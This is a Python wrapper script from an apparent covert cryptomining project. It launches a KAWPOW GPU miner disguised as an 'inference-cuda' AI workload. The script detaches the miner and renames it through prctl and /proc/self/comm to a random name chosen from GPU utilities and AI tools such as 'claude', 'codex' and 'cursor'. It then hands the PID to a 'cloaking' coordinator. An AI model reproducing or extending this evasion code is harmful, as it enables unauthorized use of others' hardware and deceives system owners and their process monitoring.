import os
import sys
import signal
import time
import subprocess
import threading
import random
from pathlib import Path
import ctypes # Thêm thư viện ctypes để gọi syscall

# PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("⚠️ [PHASE3+] psutil not available - fallback to static timing")

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.module_loggers import get_stealth_inference_logger
    from mining_environment.coordination.coordinator import HookCoordinator
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging với GPU-specific logger name
logger = get_stealth_inference_logger()

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi GPU process bị terminate.
    """
    logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")

    # Self-stealth functionality removed - no cleanup needed
    logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleanup completed")

    sys.exit(0)

def monitor_and_log_output(process, process_name):
    """
    **[Output Monitor Thread]** (luồng giám sát đầu ra)
    Đọc stdout và stderr từ tiến trình con và ghi lại bằng logger.
    """
    def log_stream(stream, stream_name):
        for line in iter(stream.readline, ''):
            if line.strip():
                logger.info(f"[{process_name}-{stream_name}] {line.strip()}")
        stream.close()

    stdout_thread = threading.Thread(target=log_stream, args=(process.stdout, 'stdout'))
    stderr_thread = threading.Thread(target=log_stream, args=(process.stderr, 'stderr'))
    stdout_thread.start()
    stderr_thread.start()
    stdout_thread.join()
    stderr_thread.join()

def create_enhanced_gpu_environment():
    """
    **[Enhanced GPU Environment Creator]** (tạo môi trường GPU tối ưu)

    Tái sử dụng patterns từ existing modules để tạo clean environment
    cho GPU subprocess với enhanced resource management.

    Returns:
        dict: Clean environment dictionary for GPU subprocess
    """
    logger.info("🔧 [GPU-ENV-OPTIMIZER] Creating enhanced GPU environment using existing patterns")

    # Base environment copy
    clean_env = os.environ.copy()

    # 1. LD_PRELOAD Management - Clean removal to avoid legacy hooks
    if 'LD_PRELOAD' in clean_env:
        clean_env.pop('LD_PRELOAD', None)
        logger.info("🔧 [GPU-ENV-OPTIMIZER] Removed LD_PRELOAD completely (legacy hooks disabled)")

    # 2. NVML Management - Defaults only (no external interceptors)
    clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
    clean_env['GPU_MINING_SUBPROCESS'] = '1'

    # 3. CUDA Resource Optimization - Inspired by resource_control.py
    cuda_optimizations = {
        'CUDA_LAUNCH_TIMEOUT': '30',
        'CUDA_DEVICE_MAX_CONNECTIONS': '1',
        # CUDA_VISIBLE_DEVICES removed - let CUDA runtime auto-detect all GPUs
        'CUDA_CACHE_DISABLE': '1',
        'NVIDIA_DRIVER_CAPABILITIES': 'compute',
        # Additional GPU-specific optimizations
        'CUDA_FORCE_PTX_JIT': '1',          # Force JIT compilation for stability
        'CUDA_DISABLE_CUBLASLT': '1',       # Disable problematic cuBLAS components
        'CUDA_MODULE_LOADING': 'LAZY'       # Lazy loading to reduce memory pressure
    }

    for key, value in cuda_optimizations.items():
        clean_env[key] = value

    logger.info(f"✅ [GPU-ENV-OPTIMIZER] Applied {len(cuda_optimizations)} CUDA optimizations")
    return clean_env

def main():
    """
    **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
    """
    try:
        logger.info("🚀 [GPU-STEALTH-WRAPPER] Starting Stealth GPU-CUDA Inference Wrapper")

        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)

        # Parse command line arguments (forward tất cả args to inference-cuda)
        cuda_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")

        # ✅ OPTIMIZED: Use enhanced GPU environment creator - Tái sử dụng existing patterns
        clean_env = create_enhanced_gpu_environment()

        # Get inference-cuda binary path from environment
        cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
        if not os.path.exists(cuda_inference_path):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not found: {cuda_inference_path}")
            sys.exit(1)

        # Verify binary is executable
        if not os.access(cuda_inference_path, os.X_OK):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not executable: {cuda_inference_path}")
            sys.exit(1)

        logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")

        # Self-stealth functionality removed - process renaming now handled by child process management
        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")

        # Small delay để đảm bảo process ready
        time.sleep(1)

        # Prepare command để exec inference-cuda
        exec_command = [cuda_inference_path] + cuda_inference_args
        logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")

        # 🚀 PHASE 2: GPU Process Stealth Implementation
        logger.info("🔄 [GPU-STEALTH] Using optimized subprocess stealth mode")

        try:
            # Memory optimization trước khi start inference-cuda
            logger.info("🧠 [MEMORY-OPT] Pre-execution memory optimization...")

            # Set DAG generation memory limits
            clean_env['CUDA_LAUNCH_BLOCKING'] = '1'  # Synchronous CUDA calls
            clean_env['CUDA_CACHE_DISABLE'] = '1'    # Disable CUDA cache during DAG gen
            clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'  # Limit concurrent connections

            # **🥇 TIER 8 FIX: Configuration Auto-Apply - Ensure critical environment variables are always set**
            # Progressive memory allocation cho DAG – ALWAYS set to ensure proper DAG generation
            clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'  # Enable progressive DAG loading (critical)
            logger.info(f"🔧 [TIER-8-CONFIG] Auto-set KAWPOW_DAG_PROGRESSIVE=1 for DAG generation")

            # **TIER 8 FIX: Apply additional critical environment variables**
            critical_vars = {
                'KAWPOW_DAG_PROGRESSIVE': '1',        # Critical for DAG generation
                'CUDA_LAUNCH_BLOCKING': '1',         # Prevent CUDA launch failures
                'CUDA_CACHE_DISABLE': '1',           # Prevent cache conflicts during DAG gen
                'CUDA_DEVICE_MAX_CONNECTIONS': '1', # Prevent memory overload
            }

            for var_name, var_value in critical_vars.items():
                clean_env[var_name] = var_value
                logger.debug(f"🔧 [TIER-8-CONFIG] Set {var_name}={var_value}")

            logger.info(f"✅ [TIER-8-CONFIG] Applied {len(critical_vars)} critical environment variables")

            # Optional: User-defined memory limit (if provided)
            if 'KAWPOW_DAG_MEMORY_LIMIT' in os.environ:
                clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
                logger.info(f"🔧 [TIER-8-CONFIG] Applied user-defined KAWPOW_DAG_MEMORY_LIMIT")

            logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")

            # Start inference-cuda as subprocess
            # Pre-select child target name and setup preexec self-rename
            stealth_names = [
                "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
                "nvidiasettings", "gpumanager", "glxgears",
                "vulkaninfo", "mesaloader", "drmtip",
                "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
                "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
                "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
            ]
            child_target_name = random.choice(stealth_names)

            def _sanitize_comm_name(name: str) -> str:
                """
                Chuẩn hóa tên tiến trình cho /proc/*/comm: whitelist ký tự an toàn và giới hạn ≤15 byte.
                """
                allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
                filtered = ''.join(ch for ch in name if ch in allowed)
                if not filtered:
                    filtered = "gpuworker"
                b = filtered.encode('utf-8')[:15]
                return b.decode('utf-8', errors='ignore')

            safe_name = _sanitize_comm_name(child_target_name)

            disable_rename = os.getenv('DISABLE_PROCESS_RENAME', '0') == '1'
            if disable_rename:
                logger.info("⛔ [STEALTH-BYPASS] DISABLE_PROCESS_RENAME=1 → skipping all process renaming")


            def _child_preexec():
                """
                Child pre-exec hook: tách nhóm tiến trình và tự đổi tên qua /proc/self/comm.
                Tránh logging trong preexec để an toàn trước exec.
                """
                if disable_rename:
                    return
                try:
                    os.setsid()
                except Exception:
                    pass
                # Prefer prctl(PR_SET_NAME) để tên tồn tại bền vững qua exec
                try:
                    import ctypes
                    libc = ctypes.CDLL('libc.so.6')
                    PR_SET_NAME = 15
                    # Dùng buffer cố định 16B, thiết lập argtypes/restype để tránh lỗi chuyển kiểu
                    buf = ctypes.create_string_buffer(16)
                    buf.value = safe_name.encode('utf-8')[:15]
                    libc.prctl.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong]
                    libc.prctl.restype = ctypes.c_int
                    libc.prctl(PR_SET_NAME, ctypes.addressof(buf), 0, 0, 0)
                except Exception:
                    pass
                try:
                    with open("/proc/self/comm", "wb") as f:
                        f.write(safe_name.encode("utf-8"))
                except Exception:
                    pass

            # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
            process = subprocess.Popen(
                exec_command,
                env=clean_env,  # Use clean environment for subprocess ONLY
                preexec_fn=None if disable_rename else _child_preexec,
                # stdout and stderr will inherit parent's pipes for logging
                stdout=subprocess.PIPE, # Giữ lại để có thể log output
                stderr=subprocess.PIPE, # Giữ lại để có thể log output
                text=True
            )
            logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")

            # Start monitoring output in a separate thread (ensure mining stdout/stderr are captured)
            monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda'))
            monitor_thread.daemon = True
            monitor_thread.start()
            # ---- New: Rename child PID and register to DirectPIDRegistry ----
            try:
                # /proc/<pid>/comm expects ≤15 byte; child self-rename đã được thiết lập qua preexec_fn
                new_name = safe_name

                # ✅ Child self-rename sẽ chạy trong preexec_fn; giữ background thread như fallback
                logger.info(f"🔒 [GPU-POST-EXEC-STEALTH] Child self-rename scheduled via preexec_fn (PID {process.pid}) target='{new_name}'")

                # ====================================
                # LINEAR FLOW: Enhanced Readiness Check & Hook Sequencing
                # ====================================

                def _enhanced_readiness_check(process, timeout=30, subprocess_env=None):
                    """
                    **Enhanced Readiness Check** (kiểm tra sẵn sàng nâng cao) for subprocess DAG completion.

                    Reused logic from HookCoordinator._enhanced_readiness_check() adapted for subprocess.

                    Args:
                        process: subprocess.Popen object
                        timeout: timeout tối đa (giây)
                        subprocess_env: subprocess environment dict for context-aware checking

                    Returns:
                        bool: True nếu DAG allocation complete, False nếu timeout hoặc process failed
                    """
                    start_time = time.time()
                    consecutive_checks = 2
                    MINIMUM_THRESHOLD = 0.6  # 60% score required to pass

                    logger.info(f"🚀 [READINESS-START] Starting enhanced readiness check for PID {process.pid} with timeout={timeout}s")

                    while time.time() - start_time < timeout:
                        checks = {
                            'process_alive': 1.0 if process.poll() is None else 0.0,  # Check if process is still running
                            'env_config': 1.0 if subprocess_env and subprocess_env.get('KAWPOW_DAG_PROGRESSIVE') == '1' else 0.5,  # DAG config check
                            'time_elapsed': min(1.0, (time.time() - start_time) / 10.0)  # Give time for DAG generation (10s scale)
                        }

                        # Calculate weighted score
                        weights = {
                            'process_alive': 0.6,    # 60% - Process must be alive (most critical)
                            'env_config': 0.2,       # 20% - Environment configuration
                            'time_elapsed': 0.2      # 20% - Allow time for DAG generation
                        }

                        weighted_score = sum(checks[check] * weights[check] for check in checks)
                        passed_checks = sum(1 for score in checks.values() if score > 0.5)
                        total_checks = len(checks)

                        logger.info(f"📊 [READINESS-PROGRESS] Weighted score: {weighted_score:.3f} ({passed_checks}/{total_checks} checks > 0.5)")

                        # Log chi tiết từng check
                        for check_name, result in checks.items():
                            status_icon = "✅" if result > 0.5 else "⚠️"
                            status = "PASS" if result > 0.5 else "NEEDS ATTENTION"
                            logger.info(f"   ├─ {check_name}: {status_icon} {status} (score: {result:.3f})")

                        # Check if threshold met
                        if weighted_score >= MINIMUM_THRESHOLD:
                            # Quick stability check
                            stability_count = 0
                            for i in range(consecutive_checks):
                                time.sleep(0.5)  # Brief stability check
                                if process.poll() is not None:  # Process died
                                    logger.warning(f"⚠️ [READINESS-STABILITY] Process {process.pid} died at verification {i+1}")
                                    break
                                stability_count += 1

                            if stability_count == consecutive_checks:
                                logger.info(f"✅ [READINESS-STABLE] Process {process.pid} verified stable (score: {weighted_score:.3f})")
                                return True

                        # Brief wait before next check
                        time.sleep(1)

                    # Timeout reached
                    logger.warning(f"⏰ [READINESS-TIMEOUT] Enhanced readiness check timeout after {timeout}s (final score: {weighted_score:.3f})")
                    return False

                def _simplified_hook_sequencing():
                    """
                    Hook sequencing disabled – gpu_plugins and related hook libraries removed.
                    Perform readiness check only; do not enable any external hooks.
                    """
                    try:
                        logger.info("🚀 [HOOK-SEQ] Starting readiness check (hooks disabled)...")
                        if not _enhanced_readiness_check(process, timeout=30, subprocess_env=clean_env):
                            logger.error("❌ [HOOK-SEQ] Readiness check failed - DAG allocation incomplete")
                            return False
                        logger.info("✅ [HOOK-SEQ] Readiness check passed - proceeding without external hooks")
                        return True
                    except Exception as e:
                        logger.error(f"❌ [HOOK-SEQ] Failed: {e}")
                        return False

                # Start simplified hook sequencing in background
                threading.Thread(target=_simplified_hook_sequencing, daemon=True).start()
                logger.info("🚀 [LINEAR-FLOW] Simplified hook sequencing started")

                # 🚀 **PRIMARY HANDOFF TO HOOKCOORDINATOR** (chuyển giao chính đến HookCoordinator)
                # This is the single point of entry for PID registration.
                # The fallback logic has been removed to prevent context mismatch.
                try:
                    from mining_environment.coordination.coordinator import get_hook_coordinator

                    process_metadata = {
                        'stealth_name': new_name,
                        'role': 'real',
                        'timestamp': time.time(),
                        'wrapper_pid': os.getpid(),
                        'stealth_enabled': True,
                        'registration_source': 'stealth_inference_cuda'
                    }

                    coordinator = get_hook_coordinator()
                    success = coordinator.receive_from_stealth_wrapper(
                        pid=process.pid,
                        process_metadata=process_metadata,
                        subprocess_env=clean_env
                    )

                    if success:
                        logger.info(f"✅ [HANDOFF] Primary handoff to HookCoordinator successful for PID={process.pid}")
                        logger.info(f"🔗 [HANDOFF] Coordination chain: HookCoordinator → DirectPIDRegistry → ResourceManager")
                    else:
                        logger.error(f"❌ [HANDOFF] Primary handoff to HookCoordinator FAILED for PID {process.pid}")
                        logger.warning(f"⚠️ [HANDOFF] Mining will continue, but cloaking and optimization will be DISABLED.")

                except Exception as handoff_err:
                    logger.critical(f"🚨 [HANDOFF-CRITICAL] Could not perform handoff to HookCoordinator: {handoff_err}")
                    logger.warning(f"⚠️ [HANDOFF-CRITICAL] This is a critical architecture failure. Cloaking is non-functional.")
            except Exception as rename_err:
                logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")

            # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - (đã loại bỏ logic pidfd_send_signal theo yêu cầu làm sạch mã)

            # Wait for subprocess to complete
            return_code = process.wait()
            logger.info(f"🔚 [GPU-POST-EXEC-STEALTH] inference-cuda subprocess completed with code: {return_code}")

            # Cleanup - stealth_manager functionality removed
            logger.info("🧹 [GPU-STEALTH-WRAPPER] Process cleanup completed")
            sys.exit(return_code)

        except Exception as e:
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [GPU-STEALTH-WRAPPER] Falling back to subprocess mode")

            try:
                # Run inference-cuda as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    preexec_fn=None if disable_rename else _child_preexec,
                    env=clean_env  # Use clean environment for fallback subprocess too
                )

                logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")

                # Start monitoring output in a separate thread
                monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda-fallback'))
                monitor_thread.daemon = True
                monitor_thread.start()

                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [GPU-STEALTH-WRAPPER] inference-cuda subprocess completed with code: {return_code}")

                # Cleanup - stealth_manager functionality removed
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Subprocess cleanup completed")
                sys.exit(return_code)

            except Exception as subprocess_error:
                logger.error(f"❌ [GPU-STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Error cleanup completed")
                sys.exit(1)

    except Exception as e:
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()